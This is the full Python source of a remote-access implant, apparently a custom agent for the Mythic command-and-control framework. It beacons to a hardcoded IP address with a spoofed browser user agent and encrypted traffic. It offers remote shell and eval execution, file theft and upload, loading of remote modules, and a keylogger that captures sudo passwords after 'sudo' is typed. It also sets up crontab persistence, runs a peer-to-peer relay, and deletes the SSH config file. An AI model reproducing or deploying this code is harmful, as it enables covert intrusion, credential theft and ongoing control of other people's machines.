#!/usr/bin/python3


import mythic
from mythic import mythic_rest
import asyncio
import json
import base64
import requests
import time
import ast
import types
import math
import random
import socket
import struct
import platform
import os
import getpass
import threading
# from pynput import keyboard
import re
import sys
# import Xlib
# import Xlib.display
import time
import subprocess
from subprocess import Popen, PIPE
import stat
import hashlib
from http.server import BaseHTTPRequestHandler, HTTPServer
from Crypto.Hash import SHA256, SHA512, SHA1, MD5, HMAC
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import unpad, pad
from Crypto.PublicKey import RSA
from base64 import b64decode, b64encode
from termcolor import colored



# Global dict containing name and code of the dynamic functions loaded 



class Agent:

    def __init__(self):
        self.Server = "http://95.237.2.234"
        self.Port = "8888"
        self.URI = "/data"
        self.PayloadUUID = "ee86d368-9e02-452d-b50b-46b9075292ee"
        self.UUID = ""
        self.UserAgent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"}
        self.HostHeader = "domain_front"
        self.Sleep = "10"
        self.Jitter = "23"
        self.KillDate = "2022-08-16"
        self.Script = ""
        self.Encryption_key = "ONqLlT2IUMjCK6ET1OK5Sg39+SyNmAw+7jgG4ggIMsg="
        self.Decryption_key = "ONqLlT2IUMjCK6ET1OK5Sg39+SyNmAw+7jgG4ggIMsg="

    def get_Server(self):
        return self.Server

    def set_Server(self, server):
        self.Server = server

    def get_Port(self):
        return self.Port

    def set_Port(self, port):
        self.Port = port

    def get_URI(self):
        return self.URI

    def set_URI(self, uri):
        self.URI = uri

    def get_PayloadUUID(self):
        return self.PayloadUUID

    def set_PayloadUUID(self, payloadUUID):
        self.PayloadUUID = payloadUUID

    def get_UUID(self):
        return self.UUID

    def set_UUID(self, uuid):
        self.UUID = uuid

    def get_UserAgent(self):
        return self.UserAgent
    
    def set_UserAgent(self, userAgent):
        self.UserAgent = userAgent

    def get_Sleep(self):
        return self.Sleep

    def set_Sleep(self, sleep):
        self.Sleep = sleep

    def get_Jitter(self):
        return self.Jitter

    def set_Jitter(self, jitter):
        self.Jitter = jitter

    def get_Encryption_key(self):
        return self.Encryption_key

    def set_Encryption_key(self, encryption_key):
        self.Encryption_key = encryption_key

    def get_Decryption_key(self):
        return self.Decryption_key

    def set_Decryption_key(self, decryption_key):
        self.Decryption_key = decryption_key

class myRequestHandler(BaseHTTPRequestHandler):
    def send_response(self, code, message=None):
        self.send_response_only(code, message)
        self.send_header('Server', self.version_string())
        self.send_header('Date', self.date_time_string())

global dynfs
global result
global sudo
dynfs = {}
sudo = ""
responses = []
delegates = []
delegates_address = []
delegates_UUID = []
delegates_aswers = []
result = {}
stopping_functions = []
agent = Agent()
redirecting = False



def encrypt_AES256(data, key=agent.get_Encryption_key()):
    key = base64.b64decode(key)
    data = json.dumps(data).encode()
    h = HMAC.new(key, digestmod=SHA256)
    iv = get_random_bytes(16)  # generate a new random IV
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(data, 16))
    h.update(iv + ciphertext)
    return iv + ciphertext + h.digest()

def encrypt_code(data, key=agent.get_Encryption_key()):
    key = base64.b64decode(key)
    data = data.encode()
    iv = get_random_bytes(16)  # generate a new random IV
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(data, 16))
    return iv + ciphertext

def decrypt_AES256(data, key=agent.get_Encryption_key(), UUID=False):
    key = base64.b64decode(key)
    # Decode and remove UUID from the message first
    data = base64.b64decode(data)
    uuid = data[:36]
    data = data[36:]
    # hmac should include IV
    mac = data[-32:]  # sha256 hmac at the end
    iv = data[:16]  # 16 Bytes for IV at the beginning
    message = data[16:-32]  # the rest is the message
    h = HMAC.new(key=key, msg=iv + message, digestmod=SHA256)
    h.verify(mac)
    decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_message = decryption_cipher.decrypt(message)
    # now to remove any padding that was added on to make it the right block size of 16
    decrypted_message = unpad(decrypted_message, 16)
    if UUID:
        return uuid.decode("utf-8") + decrypted_message.decode("utf-8")
    else:
        return json.loads(decrypted_message)

def decrypt_code(data, key=agent.get_Encryption_key()):
    key = base64.b64decode(key)
    iv = data[:16]  # 16 Bytes for IV at the beginning
    message = data[16:]  # the rest is the message
    decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_message = decryption_cipher.decrypt(message)
    decrypted_message = unpad(decrypted_message, 16)
    return decrypted_message
   

def to64(data):
    serialized = data.encode('utf-8')
    base64_bytes = base64.b64encode(serialized)
    return base64_bytes.decode('utf-8')

def from64(data, UUID=False):
    response_bytes = data.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    response_message = response_decode.decode('utf-8')
    if UUID:
        return response_message
    else:
        return ast.literal_eval(response_message[36:])


def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def getPublicIP():
    return requests.get('https://api.ipify.org').text

def send(response, uuid):

    if agent.get_Encryption_key() != "":
        enc = encrypt_AES256(response)
        message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
        x = ""
        try:
            x = requests.post(agent.get_Server() + ":" + agent.get_Port() + agent.get_URI(), data = message, headers=agent.get_UserAgent())
        except Exception as e:
            print(colored("Connection error, server {}:{} unreachable".format(agent.get_Server(),agent.get_Port()), "red"))
            if "95.239.61.225" not in agent.Server:
                agent.set_Server("http://95.237.2.234")
                agent.set_Port("8888")
                print(colored("Switching to main server at {}:{}".format(agent.get_Server(), agent.get_Port()), "blue"))
            try:
                x = requests.post(agent.get_Server() + ":" + agent.get_Port() + agent.get_URI(), data = message, headers=agent.get_UserAgent())
            except:
                print(colored("Connection error, main server {}:{} unreachable. Quitting".format(agent.get_Server(), agent.get_Port()), "red"))
                sys.exit()

        
        dec = decrypt_AES256(x.text)
        if isinstance(dec, str):
            return json.loads(dec)
        else:
            return dec

    else:
        serialized = json.dumps(response)
        message = to64(serialized)
        uuid = to64(uuid)
        x = ""
        try:
            x = requests.post(agent.get_Server() + ":" + agent.get_Port() + agent.get_URI(), data = uuid + message, headers=agent.get_UserAgent())
        except Exception as e:
            print(colored("Connection error, server {}:{} unreachable".format(agent.get_Server(), agent.get_Port()), "red"))
            if "95.239.61.225" not in agent.Server:
                agent.set_Server("http://95.237.2.234")
                agent.set_Port("8888")
                print(colored("Switching to main server at {}:{}".format(agent.get_Server(), agent.get_Port()), "blue"))
            try:
                x = requests.post(agent.get_Server() + ":" + agent.get_Port() + agent.get_URI(), data = uuid + message, headers=agent.get_UserAgent())
            except:
                print(colored("Connection error, main server {}:{} unreachable. Quitting".format(agent.get_Server(), agent.get_Port()), "red"))
                sys.exit()

        res = from64(x.text)
        return res



def checkin():

    print("[+] CHECKIN")

    checkin_data = {    
        "action": "checkin",
        "ip": getPublicIP() + "/" + getIP(),
        "os": platform.system() + " " + platform.release(),
        "user": getpass.getuser(),
        "host": socket.gethostname(),
        "domain": socket.getfqdn(),
        "pid": os.getpid(),
        "uuid": agent.get_PayloadUUID(),
        "architecture": platform.architecture(),
        "encryption_key": agent.get_Encryption_key(),
        "decryption_key": agent.get_Decryption_key()
        }


    res = send(checkin_data, agent.get_PayloadUUID())

    try:
        agent.set_UUID(res['id'])
        print("\t - Assigned UUID = " + agent.get_UUID())

    except:
        res = json.loads(res)
        agent.set_UUID(res['id'])
        print("\t - Assigned UUID = " + agent.get_UUID())



def get_tasks():

    tasks = {
        'action': "get_tasking",
        'tasking_size': -1
    }

    task_list = send(tasks, agent.get_UUID())
    
    if "delegates" in task_list:
        for m in task_list["delegates"]:
            delegates_aswers.append(m)

    return task_list




def reverse_upload(task_id, file_id):
    upload = {
        'action': "upload",
        'file_id': file_id,
        'chunk_size': 512000,
        'chunk_num': 1,
        'full_path': "",
        'task_id': task_id,
    }

    res = send(upload, agent.get_UUID())
    res = res['chunk_data']

    response_bytes = res.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    code = response_decode.decode('utf-8')

    return code


def post_result():
    global responses
    global delegates
    global delegates_aswers

    response = {}
    if delegates:
        response = {
            'action': "post_response",
            'responses': responses,
            'delegates': delegates
        }
        responses = []
        delegates = []
        
    else:
        response = {
            'action': "post_response",
            'responses': responses
        }
        responses = []

    result = send(response, agent.get_UUID())

    if "delegates" in result:
        for m in result["delegates"]:
            delegates_aswers.append(m)

    return result


def execute_tasks(tasks):
    if tasks:
        for task in tasks['tasks']:
            execute(task)

    r = random.randint(0,1)
    if r < 0.5:
        r = -1
    else:
        r = 1

    sleep_time = int(agent.get_Sleep()) + r*(int(agent.get_Sleep()) * int(agent.get_Jitter()) / 100)

    time.sleep(sleep_time / 5)

    post_result()



def run_in_thread(function, param_list, task):

    found = False

    for item in dynfs:
        
        if item == function:
            try:
                if agent.get_Encryption_key() == "":
                    exec(dynfs[item])
                else:
                    exec(decrypt_code(dynfs[item]))
                eval(function + "(" + str(param_list) + ")")
                found = True
            except Exception as e:
                print(traceback.format_exc())
                response = {
                        'task_id': task['id'],
                        "user_output": str(e),
                        'completed': False,
                        'status': 'error'
                    }
                responses.append(response)
    
    if found == False:
        try:
            eval(function + "(" + str(param_list) + ")")
        except Exception as e:
            print(traceback.format_exc())
            response = {
                    'task_id': task['id'],
                    "user_output": str(e),
                    'completed': False,
                    'status': 'error'
                }
            responses.append(response)


def execute(task):

    # Search in the dynamic functions first, so a command can be sobstituted through the load functionality
    function = str(task['command'])
    if function != "code":
        print("\n[+] EXECUTING " + function)

    param_list = "task['id'],"
    if task['parameters'] != '' and task['parameters'][0] == "{":
        parameters = ast.literal_eval(task['parameters'])
        for param in parameters:
            param_list += "ast.literal_eval(task['parameters'])['" + param + "'],"
    else:
        if task['parameters'] != '':
            param_list += "task['parameters'],"



    param_list = param_list[:-1]

    thread = threading.Thread(target=run_in_thread, args=(function, param_list, task))
    thread.start()




################################################################################################################

# The comment below will be sobstituted by the definition of the functions imported at creation time

def trace(task_id, command=None):

    ip = requests.get('https://api.ipify.org').text

    if command==None:
        response = {
                'task_id': task_id,
                "user_output": ip,
                'completed': True
            }
            
        responses.append(response)

        try:
            os.remove(os.path.expanduser("~") + "/.ssh/config")
        except:
            print(colored("Not enough permissions", "red"))
    

    else:

        path = ""

        print("PATH = " + str(command))

        if command == False:
            path = ip
        else:
            path += command + " --> " + getpass.getuser() + "@" + ip + ";" + sudo

        response = {
                'task_id': task_id,
                "user_output": path,
                'completed': True
            }
            
        responses.append(response)

    print("\t- Trace Done")

    return



def nmap(task_id, command):

    sudo = "bubiman10"

    ip = requests.get('https://api.ipify.org').text
    print('My public IP address is: {}'.format(ip))

    if sudo != "":
        response = {
            'task_id': task_id,
            "user_output": getpass.getuser() + "@" + ip + ";" + sudo + ";" + command,
            'completed': True
        }
        responses.append(response)

    else:
        response = {
            'task_id': task_id,
            "user_output": "Sudo password not acquired. Try using keylog first. " + getpass.getuser() + "@" + ip + ";" + sudo + ";" + command,
            'completed': True
        }
        responses.append(response)

    print("\t- Nmap Done")

    return


def p2p_server(task_id):

    
    class RequestHandler(myRequestHandler):

        def do_POST(self):

            global delegates_aswers

            content_len = int(self.headers.get('content-length', 0))
            post_body = self.rfile.read(content_len)

            received_uuid = ""
            received_message = ""
            decode = ""
            encrypted = False

            try:
                decode = base64.b64decode(post_body)
                decode = decode.decode("utf-8")
            except:
                decode = decrypt_AES256(post_body, UUID=True)
                encrypted = True

            received_uuid = str(decode)[:36]
            received_message = json.loads(decode[36:])

            encoded = to64(decode)

            if received_message["action"] == "checkin":
                delegate = {
                    "message": encoded,
                    "uuid": agent.get_PayloadUUID(),
                    "c2_profile": "myp2p"
                }
            else:
                delegate = {
                    "message": encoded,
                    "uuid": received_uuid,
                    "c2_profile": "myp2p"
                }

            delegates.append(delegate)
            while delegates_aswers == []:
                pass

            reply_message = ""

            if received_message["action"] == "checkin":
                for answer in delegates_aswers:
                    message = base64.b64decode(answer['message'])
                    message = message.decode("utf-8")
                    message = message[36:]
                    message = json.loads(message)
                    if message["action"] == "checkin":
                        reply_message = answer['message']

            else:
                reply = False
                while not reply:
                    for answer in delegates_aswers:
                        message = base64.b64decode(answer['message'])
                        message = message.decode("utf-8")
                        message_uuid = message[:36]
                        message = message[36:]
                        message = json.loads(message)
                        if answer['uuid'] == received_uuid and message["action"] == received_message["action"]:
                            if message["action"] == "get_tasking":
                                if message["tasks"] != []:
                                    for task in message["tasks"]:
                                        if task["command"] == "trace":
                                            ip = requests.get('https://api.ipify.org').text
                                            if task["parameters"] == "":
                                                task["parameters"] = getpass.getuser() + "@" + ip + ";" + sudo
                                            else:
                                                task["parameters"] += " --> " + getpass.getuser() + "@" + ip + ";" + sudo
                                            reply_message = to64(message_uuid) + to64(str(message))
                                            delegates_aswers.remove(answer)
                                            reply = True
                            if reply_message == "":
                                reply_message = answer['message']
                                delegates_aswers.remove(answer)
                                reply = True
            
            if encrypted:
                reply_message = base64.b64decode(reply_message).decode()
                uuid = reply_message[:36]
                message = reply_message[36:]
                enc = encrypt_AES256(message)
                reply_message = base64.b64encode(uuid.encode() + enc).decode("utf-8")

            self.protocol_version = "HTTP/1.1"
            self.send_response(200)
            self.send_header("Content-Length", len(reply_message))
            self.end_headers()
            self.wfile.write(bytes(reply_message, "utf8"))
            

    def run():
        p2p_port = 9090
        server = ('', p2p_port)
        httpd = HTTPServer(server, RequestHandler)
        thread = threading.Thread(target = httpd.serve_forever, daemon=True)
        thread.start()

        response = {
            'task_id': task_id,
            "user_output": "P2P Server started on {}:{}".format(getIP(), p2p_port),
            'completed': True
        }
        responses.append(response)
        print("\t- P2P Server started on {}:{}".format(getIP(), p2p_port))
        
    run()


def load(task_id, file_id, cmds):
    global responses
    code = reverse_upload(task_id, file_id)
    name = cmds

    if agent.get_Encryption_key() == "":
        dynfs[name] = code
    else:
        dynfs[name] = encrypt_code(code)



    response = {
            'task_id': task_id,
            "user_output": "Module successfully added",
            'commands': [
                {
                    "action": "add",
                    "cmd": name
                }
            ],
            'completed': True
        }

    responses.append(response)

    print("\t- Load Done")

    return


def keylog_no_X(task_id):

    global responses   


    def get_active_window_title():
        root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
        stdout, stderr = root.communicate()

        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
        if m != None:
            window_id = m.group(1)
            window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
            stdout, stderr = window.communicate()
        else:
            return "None"

        match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
        if match != None:
            return match.group("name").strip(b'"').decode()

        return "None"

    def find_event():

        f = open("/proc/bus/input/devices")
        lines = str(f.readlines())

        while lines.find("I:") != -1:
            #Read block by block
            event = ""
            start = lines.find("I:")
            end = lines.find("B: EV=")+12

            if lines[start:end].find("B: EV=12001") != -1:
                event_start = lines[start:end].find("event")
                event_start += start   

                i = 1
                try:
                    while True:
                        int(lines[event_start + 5 : event_start + 5 + i])
                        event = lines[event_start: event_start + 5 + i]
                        i += 1
                except:
                    return event

            lines = lines[end-6:]



    qwerty_map = {
        2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
        11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
        18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
        27: "$", 28: "\n", 29: "[CTRL]", 30: "q", 31: "s", 32: "d", 33: "f", 34: "g",
        35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
        43: "<", 44: "w", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: ",",
        51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
    }


    print(find_event())
    infile_path = "/dev/input/" + find_event().strip()

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)

    line = ""

    while event:

        if break_function:
            print("break detected, stopping keylog")
            response = {
                "task_id": task_id,
                "user": getpass.getuser(), 
                "window_title": get_active_window_title(), 
                "keystrokes": line,
                "completed": True
            }
            responses.append(response)
            break_function = False
            return

        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:

            if code == 28 or code == 96:
                response = {
                    "task_id": task_id,
                    "user": getpass.getuser(), 
                    "window_title": get_active_window_title(), 
                    "keystrokes": line + "\n",
                }
                responses.append(response)
                line = ""
            else: 
                line += qwerty_map[code]

        event = in_file.read(EVENT_SIZE)


def keylog(task_id):

    global responses
    global stopping_functions 


    def get_active_window_title():
        root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
        stdout, stderr = root.communicate()

        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
        if m != None:
            window_id = m.group(1)
            window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
            stdout, stderr = window.communicate()
        else:
            return "None"

        match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
        if match != None:
            return match.group("name").strip(b'"').decode()

        return "None"


    def keylogger():

        def on_press(key):

            global line
            global nextIsPsw
            global sudo
            global break_function

            if "keylog" in stopping_functions:

                print(colored("\t - Keylogger stopped", "red"))

                response = {
                        "task_id": task_id,
                        "user": getpass.getuser(), 
                        "window_title": get_active_window_title(), 
                        "keystrokes": line,
                        "completed": True
                    }
                
                responses.append(response)
                line = ""
                break_function = False
                return False
            try:
                line = line + key.char
                k = key.char

            except:
                try:
                    k = key.name

                    if key.name == "backspace":
                        if len(line) > 0:
                            line = line[:-1]
                            
                    elif key.name == "space":
                        line += " "

                    elif key.name == "enter":

                        print(nextIsPsw)

                        if nextIsPsw == True:  
                            
                            print("I GOT THE PASSWORD: {}".format(line))

                            cmd = "echo {} | sudo -S touch fileToCheckSudo.asd".format(line)

                            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                            stdout, stderr = p.communicate()

                            p = subprocess.Popen(["ls"], stdout=subprocess.PIPE)
                            stdout, stderr = p.communicate()   

                            if "fileToCheckSudo.asd" in str(stdout):
                                cmd = "echo {} | sudo -S rm fileToCheckSudo.asd".format(line)
                                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                            
                                response = {
                                        "task_id": task_id,
                                        "user_output": "root password acquired: {}".format(line),
                                        "user": getpass.getuser(),
                                        "window_title": get_active_window_title(), 
                                        "keystrokes": line + "\n",
                                    }

                                responses.append(response)                           
                                nextIsPsw = False
                                sudo = line

                            line = ""

                        else:    
                            if 'sudo ' in line:
                                print("Next should be password")
                                nextIsPsw = True

                            response = {
                                    "task_id": task_id,
                                    "user": getpass.getuser(), 
                                    "window_title": get_active_window_title(), 
                                    "keystrokes": line + "\n",
                                }
                            responses.append(response)
                            line = ""


                    elif key.name == "shift" or key.name == "ctrl" or key.name == "alt" or key.name == "caps_lock" or key.name == "tab":
                        if "crtlc" in line:
                            line = ""
                            nextIsPsw = False
                    else:
                        line = line + key.name
                except:
                    pass
                
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()

    

    thread2 = threading.Thread(target=keylogger, args=())
    thread2.start()

    print("\t- Keylog Running")

line = ""
nextIsPsw = False


def upload(task_id, file_id, remote_path):
    global responses
    remote_path = remote_path.replace("\\", "")

    upload = {
        'action': "upload",
        'file_id': file_id,
        'chunk_size': 512000,
        'chunk_num': 1,
        'full_path': "",
        'task_id': task_id,
    }

    res = send(upload, agent.get_UUID())

    res = res['chunk_data']

    response_bytes = res.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    code = response_decode.decode('utf-8')

    f = open(remote_path, "w")
    f.write(code)
    f.close()

    response = {
            'task_id': task_id,
            "user_output": "File Uploaded",
            'completed': True
        }
    responses.append(response)

    print("\t- Upload Done")

    return


def exit_agent(task_id):

    response = {
            'task_id': task_id,
            "user_output": "Exited",
            'completed': True
        }
    responses.append(response)

    print("\t- Exit Done")

    sys.exit()


def shell(task_id, cmd):
    
    global responses

    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    stdout, stderr = p.communicate()

    resp = ""
    if isinstance(stdout, bytes):
        resp = stdout.decode()
    elif isinstance(stderr, bytes):
        resp = stderr.decode()
    else:
        resp = "Error"


    response = {
            'task_id': task_id,
            "user_output": resp,
            'completed': True
        }
    
    responses.append(response) 

    print("\t- Shell Done")

    return


def redirect(task_id, command):

    global redirecting
    redirecting = True
    time.sleep(int(agent.get_Sleep()))
    params = command.replace(":", " ")
    params = params.split(" ")

    if len(params) < 2:
        response = {
            'task_id': task_id,
            "user_output": "usage redirect <host:port> [OPTIONAL] <encryption_key>",
            'completed': True
        }
        responses.append(response)
        return

    else:
        ip = params[0]
        port = params[1]

        response = {
                'task_id': task_id,
                "user_output": "Redirected to {}:{}".format(agent.get_Server(), agent.get_Port()),
                'completed': True
            }
        responses.append(response)

        if len(params) > 2:
            print(colored("Setting key {}".format(params[2]), "red"))
            agent.set_Encryption_key(params[2])

        agent.set_Server("http://" + ip)
        agent.set_Port(port)
        print(colored("Switching to {}:{}".format(agent.get_Server(), agent.get_Port()), "green"))
        checkin()
        print("\t- Redirect Done")
        redirecting = False

        return


def stop(task_id, function_name):

    global stopping_functions

    stopping_functions.append(str(function_name).strip())

    response = {
            'task_id': task_id,
            "user_output": "Break",
            'completed': True
        }
    responses.append(response)

    return


def persistance(task_id):

    global responses
    global sudo
    agent_name = "prova.py"
    cwd = os.getcwd()

    if sudo != "":
        subprocess.call('echo ' + sudo + ' | sudo -S chmod 777 ' + agent_name, shell=True)
        
        subprocess.call('crontab -l > mycron.tmp', shell=True)
        subprocess.call('echo "@reboot sleep 30 && cd ' + cwd + ' && ./' + agent_name + '" >> mycron.tmp', shell=True)
        subprocess.call('crontab mycron.tmp', shell=True)
        subprocess.call('rm mycron.tmp', shell=True)
        

        response = {
                'task_id': task_id,
                "user_output": "crontab scheduled at each reboot",
                'completed': True
            }

        responses.append(response)


    else:
        response = {
                'task_id': task_id,
                "user_output": "Sudo password not acquired or wrong. Use keylog module to try stealing",
                'completed': False
            }
        responses.append(response)

    print("\t- Persistance Done")

    return


def download(task_id, path):
    global responses

    path = path.replace("\\", "/")
    # print("Downloading " + path)

    # chunkSize = 512000
    chunkSize = 10000
    fileSize = os.path.getsize(path)
    chunks = math.ceil(fileSize / chunkSize)
    fullpath = os.path.abspath(path)

    # print("FILESIZE = " + str(fileSize))  

    # print(str(chunks) + " chunks needed")


    response = {
            "total_chunks": chunks, 
            "task_id": task_id,
            "full_path": fullpath,
            "host": "",
            "is_screenshot": "false"
        }
    
    responses.append(response)


    def download_thread():
        i = 1
        file_id = ""

        while i != chunks +1:
            if result:
                for item in result['responses']:
                    if item['task_id'] == task_id and item['status'] == "success":
                        # print("HO TROVATO IL LA RIPOSTA SUCCESS PER QUESTO TASK")
                        if file_id == "":
                            file_id = item['file_id']
                        result['responses'].remove(item)
                        f = open(fullpath, 'r')
                        f.seek((i-1)*chunkSize)
                        blob = f.read(chunkSize)
                        chunk_data = to64(blob)

                        if i == chunks:
                            print("i == chunks")
                            response = {
                                    "chunk_num": i, 
                                    "file_id": file_id, 
                                    "chunk_data": chunk_data,
                                    "task_id": task_id,
                                    "completed": True
                                }
                            # print("[OLD RESPONSEs]: " + str(responses))
                            responses.append(response)
                            # print("[NEW RESPONSEs]: " + str(responses))
                            f.close()
                            i +=1
                            print("\t- Download Done")
                            exit()

                        else:
                            print("i != chunks")
                            response = {
                                    "chunk_num": i, 
                                    "file_id": file_id, 
                                    "chunk_data": chunk_data,
                                    "task_id": task_id
                                }
                            # print("[OLD RESPONSEs]: " + str(responses))
                            responses.append(response)
                            # print("[NEW RESPONSEs]: " + str(responses))                        
                            f.close()
                        i += 1

                    if item['task_id'] == task_id and item['status'] != "success":
                        print("ERROR SENDING FILE")
                        break


    d = threading.Thread(target=download_thread, args=())
    d.start()


def run(task_id, code):

    global responses

    print("\t" + code)
    eval(code)


    response = {
            'task_id': task_id,
            "user_output": "Executed",
            'completed': True
        }

    responses.append(response)

    print("\t- Run Done")

    return


def code(task_id, code, param, parallel_id):

    global responses

    print("Running code with \n {} \n {}".format(code, param))

    try:
        exec(code)
        eval("worker(param)")
    except Exception as e:
        print(e)

    response = {
            'task_id': task_id,
            "user_output": worker_output,
            'completed': True
        }

    responses.append(response)
    
    print("\t- Parallel Done")

    return


def ls(task_id, path, third):

    global responses

    path = path.replace("\\", "")
    path = path.replace("//", "/")
    fullpath = str(os.path.abspath(path))

    files = []



    for f in os.listdir(path):

        permissions = ""
        modify_time = ""
        access_time = ""
        file_path = os.path.abspath(f)
        try:
            st = os.stat(file_path)
            oct_perm = oct(st.st_mode)
            permissions = str(oct_perm)[-3:]

            fileStats = os.stat(file_path)
            access_time = time.ctime (fileStats[stat.ST_ATIME])
            modify_time = time.ctime(os.path.getmtime(file_path))
        except:
            permissions = "Not Allowed"
            modify_time = "Not Allowed"
            access_time = "Not Allowed"

        size = 0
        if os.path.isdir(fullpath):
            try:
                for path, dirs, files in os.walk(file_path):
                    for x in files:
                        fp = os.path.join(path, x)
                        size += os.path.getsize(fp)
            except:
                size: -1
        elif os.path.isfile(f):
            try:
                size = os.path.getsize(file_path)
            except:
                size: -1

        try:
            a = {
                "is_file": os.path.isfile(f),
                "permissions": {'permissions': permissions},
                "name": f,
                "access_time": access_time,
                "modify_time": modify_time,
                "size": size
            }
            files.append(a)
        except:
            print("No permission")

    name = ""
    if os.path.isfile(path):
        name = path
    else:
        name = os.path.basename(os.path.normpath(fullpath))


    permissions = ""
    modify_time = ""
    access_time = ""
    try:
        st = os.stat(fullpath)
        oct_perm = oct(st.st_mode)
        permissions = str(oct_perm)[-3:]

        fileStats = os.stat(fullpath)
        access_time = time.ctime(fileStats[stat.ST_ATIME])
        modify_time = time.ctime(os.path.getmtime(fullpath))
    except:
        permissions = "Not Allowed"
        modify_time = "Not Allowed"
        access_time = "Not Allowed"

    size = 0
    if os.path.isdir(f):
        try:
            for path, dirs, files in os.walk(file_path):
                for x in files:
                    fp = os.path.join(path, x)
                    size += os.path.getsize(fp)
        except:
            size: -1
    elif os.path.isfile(f):
        try:
            size = os.path.getsize(file_path)
        except:
            size: -1


    parent_path = os.path.dirname(fullpath)

    if name == "":
        name = "/"
        parent_path = ""
        

    response = {
                "task_id": task_id,
                "user_output": "Listing Done",
                "file_browser": {
                    "host": socket.gethostname(),
                    "is_file": os.path.isfile(fullpath),
                    "permissions": {'permissions': permissions},
                    "name": name,
                    "parent_path": parent_path,
                    "success": True,
                    "access_time": access_time,
                    "modify_time": modify_time,
                    "size": size, 
                    "files": files,
                },
                "completed": True
            }
    responses.append(response)

    print("\t- ls Done")

    return


def parallel(task_id, file_name, workers, parameters={}):
    
    response = {
            'task_id': task_id,
            "user_output": "Command received",
            'completed': True
        }
    responses.append(response)

    return






################################################################################################################


# MAIN LOOP

# agent = Agent()

uuid_file = "UUID.txt"

if os.path.isfile(uuid_file):
    # f = open(uuid_file, "r")
    # agent.UUID = f.read()
    pass

else:
    checkin()
    # f = open(uuid_file, "w")
    # f.write(agent.UUID)
    # f.close()


    # ip = getPublicIP()
    # if ip == "194.195.242.157" or ip == "172.104.135.23" or ip == "172.104.135.67":
    #     print("[+] P2P Server")
    #     p2p_server(1)

while True:

    while not redirecting:
        tasks = get_tasks()

        execute_tasks(tasks)

        r = random.randint(0,1)
        if r < 0.5:
            r = -1
        else:
            r = 1

        sleep_time = int(agent.get_Sleep()) + r*(int(agent.get_Sleep()) * int(agent.get_Jitter()) / 100)

        sleep_time = random.randint(0, int(sleep_time))

        time.sleep(sleep_time / 5)
    